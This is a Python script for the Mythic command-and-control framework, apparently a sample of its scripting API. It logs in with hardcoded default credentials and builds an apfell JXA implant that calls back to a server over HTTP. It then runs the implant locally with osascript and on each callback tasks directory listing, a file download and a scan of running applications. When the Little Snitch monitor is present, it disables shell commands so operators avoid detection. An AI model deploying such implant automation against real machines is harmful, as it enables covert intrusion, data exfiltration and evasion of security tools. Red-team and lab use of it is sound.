from mythic import *
from sys import exit
from os import system


async def scripting():
    # sample login
    mythic = Mythic(
        username="mythic_admin",
        password="mythic_password",
        server_ip="192.168.205.151",
        server_port="7443",
        ssl=True,
        global_timeout=-1,
    )
    print("[+] Logging into Mythic")
    await mythic.login()
    await mythic.set_or_create_apitoken()
    
    p = Payload(
        payload_type="apfell", 
        c2_profiles={
            "HTTP":[
                    {"name": "callback_host", "value": "http://192.168.205.151"},
                    {"name": "callback_interval", "value": 4}
                ]
            },
        tag="test build",
        filename="scripted_apfell.js")
    print("[+] Creating new apfell payload")
    resp = await mythic.create_payload(p, all_commands=True, wait_for_build=True)
    print("[*] Downloading apfell payload")
    payload_contents = await mythic.download_payload(resp.response)
    print("[*] waiting for new callbacks...")
    await mythic.listen_for_new_callbacks(analyze_callback)
    print("[*] waiting for new files...")
    await mythic.listen_for_new_files(analyze_file_upload_download)
    with open("scripted_apfell.js", 'wb') as f:
        f.write(payload_contents)
    system("osascript scripted_apfell.js &")
    print("[+] started jxa agent locally")
    
    new_op = await mythic.create_operation(Operation(name="test", admin=Operator(username="mythic_admin")))
    await json_print(new_op)

async def analyze_callback(mythic, callback):
    try:
        task = Task(
            callback=callback, command="ls", params="."
        )
        print("[+] got new callback, issuing ls")
        submit = await mythic.create_task(task, return_on="completed")
        print("[*] waiting for ls results...")
        results = await mythic.gather_task_responses(submit.response.id, timeout=20)
        folder  = json.loads(results[0].response)
        print("[*] going through results looking for interesting files...")
        for f in folder["files"]:
            if f["name"] == "apfellserver":
                task = Task(
                    callback=callback, command="download", params="apfellserver"
                )
                print("[+] found an interesting file, tasking it for download")
                await mythic.create_task(task, return_on="submitted")
        task = Task(
            callback=callback, command="list_apps"
        )
        print("[+] tasking callback to list running applications")
        list_apps_submit = await mythic.create_task(task, return_on="submitted")
        print("[*] waiting for list_apps results...")
        results = await mythic.gather_task_responses(list_apps_submit.response.id)
        apps = json.loads(results[0].response)
        print("[*] going through results looking for dangerous processes...")
        for a in apps:
            if "Little Snitch Agent" in a["name"]:
                list_apps_submit.response.comment = "Auto processed, created alert on Little Snitch Agent, updating block lists"
                await mythic.set_comment_on_task(list_apps_submit.response)
                print("[+] found a dangerous process! Little Snitch Agent - sending alert to operators")
                await mythic.create_event_message(message=EventMessage(message="LITTLE SNITCH DETECTED on {}".format(callback.host), level='warning'))
                resp = await mythic.get_all_disabled_commands_profiles()
                print("[+] Getting/creating disabled command profile to prevent bad-opsec commands based on dangerous processes")
                snitchy_block_list_exists = False
                for cur_dcp in resp.response:
                    if cur_dcp.name == "snitchy block list":
                        snitchy_block_list_exists = True
                        dcp = cur_dcp
                if not snitchy_block_list_exists:
                    dcp = DisabledCommandsProfile(name="snitchy block list", payload_types=[
                        PayloadType(ptype="apfell", commands=["shell", "shell_elevated"]),
                        PayloadType(ptype="poseidon", commands=["shell"])
                    ])
                    resp = await mythic.create_disabled_commands_profile(dcp)
                current_operation = (await mythic.get_current_operation_info()).response
                for member in current_operation.members:
                    print("[*] updating block list for {}".format(member.username))
                    resp = await mythic.update_disabled_commands_profile_for_operator(profile=dcp, operator=member, operation=current_operation)

    except Exception as e:
        print(str(e))

async def analyze_file_upload_download(mythic, file):
    try:
        if file.total_chunks == file.chunks_received:
            if file.is_download_from_agent:
                print("[+] Notified of finished file download, pulling from server for offline analysis...")
                contents = await mythic.download_file(file)
                with open("downloaded_file", "wb") as f:
                    f.write(contents)
            else:
                print("this is an upload")

        else:
            print(f"[*] Don't have full file yet: {file.chunks_received} of {file.total_chunks} so far")
    except Exception as e:
        print(e)

async def main():
    await scripting()
    try:
        while True:
            pending = asyncio.Task.all_tasks()
            plist = []
            for p in pending:
                if p._coro.__name__ != "main" and p._state == "PENDING":
                    plist.append(p)
            if len(plist) == 0:
                exit(0)
            else:
                await asyncio.gather(*plist)
    except KeyboardInterrupt:
        pending = asyncio.Task.all_tasks()
        for t in pending:
            t.cancel()

loop = asyncio.get_event_loop()
loop.run_until_complete(main())
